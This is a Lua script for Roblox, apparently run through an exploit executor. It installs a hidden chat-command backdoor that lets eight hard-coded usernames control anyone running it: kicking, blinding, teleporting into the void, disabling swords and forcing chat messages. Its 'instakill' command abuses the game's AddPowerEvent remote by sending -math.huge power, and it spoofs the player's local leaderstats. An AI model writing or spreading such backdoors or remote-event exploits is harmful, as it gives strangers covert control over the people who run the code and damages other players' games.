local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local Admins = {
    ["QT_xAraa"] = true,
    ["Shot16kill"] = true,
    ["theoverryou3_alt"] = true,
    ["Raiden_Nika"] = true,
    ["philippinesBraxy123"] = true,
    ["Brxy_Alt"] = true,
    ["Bowmbaclaat"] = true,
    ["Drenvoryth"] = true
}

local OrigSize = Vector3.new(89.47997283935547, 0.05000000074505806, 38.62000274658203)
local FFConnection = false
local BlindGui = nil

local function SwordEquipper()
    local Backpack = LocalPlayer:FindFirstChild("Backpack")
    if Backpack then
        local Sword = Backpack:FindFirstChild("Sword")
        if Sword then
            Sword.Parent = LocalPlayer.Character
            task.wait(0.1)
            Sword.Parent = Backpack
        end
    end
end

local function FFChecker()
    while FFConnection do
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("ForceField") then
            SwordEquipper()
        end
        task.wait(0.5)
    end
end

local function ChatCommand(player, message)
    if Admins[player.Name] then
        local match1 = message:lower():match(">/%s*kick%s+([%w_]+)")
        if match1 and LocalPlayer.Name:lower():find(match1) then
            LocalPlayer:Kick("Araa and Braxy did not allow you to use this script.")
        end

        local match2 = message:lower():match(">/%s*revealusers%s*")
        if match2 then
            wait(0.5)
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Me", "All")
        end

        local match3 = message:lower():match(">/%s*void%s+([%w_]+)")
        if match3 and LocalPlayer.Name:lower():find(match3) then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -498, 0)
            end
        end

        local match4 = message:lower():match(">/%s*shutdown%s*")
        if match4 then
            TeleportService:Teleport(PlaceId, LocalPlayer)
        end

        local match5 = message:lower():match(">/%s*removeff%s+([%w_]+)")
        if match5 and LocalPlayer.Name:lower():find(match5) then
            local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
            if FFParts then
                local DetectorPart = FFParts:FindFirstChild("GiveForceFieldDetectorPart")
                if DetectorPart and DetectorPart:IsA("BasePart") then
                    DetectorPart.Size = Vector3.new(0, 0, 0)
                end
            end
            if not FFConnection then
                FFConnection = true
                task.spawn(FFChecker)
            end
        end

        local match6 = message:lower():match(">/%s*enableff%s*")
        if match6 then
            local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
            if FFParts then
                local DetectorPart = FFParts:FindFirstChild("GiveForceFieldDetectorPart")
                if DetectorPart and DetectorPart:IsA("BasePart") then
                    DetectorPart.Size = OrigSize
                end
            end
            FFConnection = false
        end

        local match7 = message:lower():match(">/%s*blind%s+([%w_]+)")
        if match7 and LocalPlayer.Name:lower():find(match7) then
            if not BlindGui then
                BlindGui = Instance.new("ScreenGui")
                BlindGui.Name = "BlindEffect"
                BlindGui.Parent = game:GetService("CoreGui")

                local BlackFrame = Instance.new("Frame")
                BlackFrame.Size = UDim2.new(10, 0, 10, 0)
                BlackFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
                BlackFrame.AnchorPoint = Vector2.new(0.5, 0.5)
                BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
                BlackFrame.BorderSizePixel = 0
                BlackFrame.Parent = BlindGui
            end
        end

        local match8 = message:lower():match(">/%s*unblind%s+([%w_]+)")
        if match8 and LocalPlayer.Name:lower():find(match8) then
            if BlindGui then
                BlindGui:Destroy()
                BlindGui = nil
            end
        end
        
        local match9 = message:lower():match(">/%s*instakill%s+([%w_]+)")
        if match9 and LocalPlayer.Name:lower():find(match9) then
            local OrigNinValue = game.Players.LocalPlayer.leaderstats.Ninjutsu.Value

            repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Train")
            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Train")
            tool.Parent = game.Players.LocalPlayer.Character

            game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -math.huge)
            wait(1)
            game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")

            while wait() do
                if game.Players.LocalPlayer.leaderstats.Ninjutsu.Value ~= OrigNinValue then
                    game.Players.LocalPlayer.leaderstats.Ninjutsu.Value = OrigNinValue
                end
            end
        end
		local match10 = message:lower():match(">/%s*spawn%s+([%w_]+)")
			if match10 and LocalPlayer.Name:lower():find(match10) then
				ReplicatedStorage.RemoteEvent.SpawnCharacterEvent:FireServer("MainSpawn")
			end
			local match11 = message:lower():match(">/%s*disablesword%s+([%w_]+)")
			if match11 and LocalPlayer.Name:lower():find(match11) then
				local Sword = LocalPlayer.Character:FindFirstChild("Sword")
				if Sword then
					for _, child in ipairs(Sword:GetChildren()) do
						child:Destroy()
					end
				else
				local Backpack = LocalPlayer:FindFirstChild("Backpack")
				if Backpack then
					Sword = Backpack:FindFirstChild("Sword")
					if Sword then
						for _, child in ipairs(Sword:GetChildren()) do
							child:Destroy()
						end
					end
				end
			end
		end
		local match12 = message:lower():match(">/%s*rejoin%s+([%w_]+)")
		if match12 and LocalPlayer.Name:lower():find(match12) then
			TeleportService:Teleport(PlaceId, LocalPlayer)
		end
	end
end

local function SetupPlayerChat(player)
    player.Chatted:Connect(function(message)
        ChatCommand(player, message)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    SetupPlayerChat(player)
end
Players.PlayerAdded:Connect(SetupPlayerChat)

local function FilterAdminMessages(player)
    player.Chatted:Connect(function(message)
        for admin, _ in pairs(Admins) do
            if player.Name == admin then
                return
            end
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    FilterAdminMessages(player)
end

Players.PlayerAdded:Connect(FilterAdminMessages)
